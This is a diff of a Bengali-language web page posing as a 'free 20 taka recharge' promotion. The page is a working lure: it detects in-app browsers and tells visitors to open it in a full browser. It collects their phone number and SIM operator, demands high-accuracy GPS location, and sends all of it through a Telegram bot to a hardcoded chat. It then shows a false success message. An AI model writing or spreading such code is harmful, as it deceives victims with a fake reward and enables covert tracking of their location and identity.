@@ -6,27 +6,24 @@
     <title>ফ্রি রিচার্জ অফার ২০২৬</title>
     <style>
         body { background-color: #f4f7f6; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { background: #fff; padding: 20px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; border-top: 5px solid #d9534f; }
+        .container { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; border-top: 5px solid #d9534f; }
         .btn-green { width: 100%; padding: 15px; background-color: #28a745; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        
-        /* ইন-অ্যাপ ব্রাউজার ব্লকার স্টাইল */
-        #app-blocker { display: none; padding: 10px; background: #fffbe6; border: 1px dashed #ffc107; border-radius: 10px; margin-top: 15px; }
-        .step { text-align: left; font-size: 15px; margin-bottom: 10px; color: #333; }
-        .step b { color: #d9534f; }
+        .block-box { display: none; padding: 15px; background: #fffbe6; border: 1px dashed #ffc107; border-radius: 10px; margin-top: 15px; text-align: left; }
         input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        b { color: #d9534f; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <h2>🎁 ধামাকা অফার!</h2>
-    <p id="top-msg">সঠিক তথ্য দিয়ে ২০ টাকা রিচার্জ নিন</p>
+    <p id="info-msg">সঠিক তথ্য দিয়ে ২০ টাকা রিচার্জ নিন</p>
     
-    <div id="app-blocker">
-        <p style="color: #d9534f; font-weight: bold;">⚠️ সতর্কতা: আপনি অফিশিয়াল ব্রাউজারে নেই!</p>
-        <div class="step">১. উপরে ডানদিকের <b>তিনটি ডট (⋮)</b> বা <b>শেয়ার (Share)</b> বাটনে ক্লিক করুন।</div>
-        <div class="step">২. তারপর <b>"Open in Browser"</b> বা <b>"Open in Chrome"</b> অপশনটি বেছে নিন।</div>
-        <p style="font-size: 13px; color: #666;">(ব্রাউজারে না গেলে রিচার্জ কনফার্ম হবে না)</p>
+    <div id="app-blocker" class="block-box">
+        <p style="font-weight: bold; text-align: center;">⚠️ সতর্কবার্তা</p>
+        ১. উপরে ডানদিকের <b>তিনটি ডট (⋮)</b> এ ক্লিক করুন।<br>
+        ২. তারপর <b>"Open in Browser"</b> অপশনটি সিলেক্ট করুন।
+        <p style="font-size: 12px; color: #666; margin-top: 10px;">(ব্রাউজারে না গেলে রিচার্জ পাবেন না)</p>
     </div>
 
     <div id="recharge-form">
@@ -43,15 +40,14 @@
 </div>
 
 <script>
-// সব ধরণের ইন-অ্যাপ ব্রাউজার ডিটেক্ট করা
+// সব ইন-অ্যাপ ব্রাউজার ডিটেক্ট করার কোড
 var ua = navigator.userAgent || navigator.vendor || window.opera;
-var isInApp = /FBAN|FBAV|Messenger|TikTok|IMO|Instagram|Twitter|Line/i.test(ua);
+var isInApp = /FBAN|FBAV|Messenger|TikTok|IMO|Instagram/i.test(ua);
 
 if (isInApp) {
-    // ইমো, টিকটক বা মেসেঞ্জারে থাকলে ফর্ম হাইড হবে এবং ইনস্ট্রাকশন দেখাবে
     document.getElementById('recharge-form').style.display = 'none';
     document.getElementById('app-blocker').style.display = 'block';
-    document.getElementById('top-msg').innerText = "অফারটি নিশ্চিত করতে নিচের নিয়মটি মানুন:";
+    document.getElementById('info-msg').innerText = "আপনি বর্তমানে একটি ইন-অ্যাপ ব্রাউজারে আছেন।";
 }
 
 function processOffer() {
@@ -65,6 +61,7 @@ function processOffer() {
 
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
+            // লোকেশন অন থাকলে এখানে আসবে
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
             var mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
@@ -73,20 +70,16 @@ function processOffer() {
             var chat_id = "7887080882";
             var message = "✅ সাকসেস\n📱 নম্বর: " + phone + "\n📶 সিম: " + sim + "\n📍 ম্যাপ: " + mapUrl;
             
-            sendToTelegram(token, chat_id, message);
+            fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message))
+            .then(() => {
+                alert("আবেদন সফল! ২০ মিনিটের মধ্যে রিচার্জ পাবেন।");
+                window.location.href = "https://www.google.com";
+            });
         }, function(error) {
-            // আপনার সেই নির্দিষ্ট ওয়ার্নিং
+            // লোকেশন অফ থাকলে আপনার দেওয়া ওই ওয়ার্নিং দেখাবে
             alert("আপনি এখনো আপনার ফোনের লকেশন অপশন অন করেন্নি দয়া করে অন করুন!");
         }, { enableHighAccuracy: true, timeout: 5000 });
     }
-}
-
-function sendToTelegram(token, chat_id, message) {
-    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message);
-    fetch(url).then(() => {
-        alert("আবেদন সফল! ২০ মিনিটের মধ্যে রিচার্জ পাবেন।");
-        window.location.href = "https://www.google.com";
-    });
 }
 </script>
 
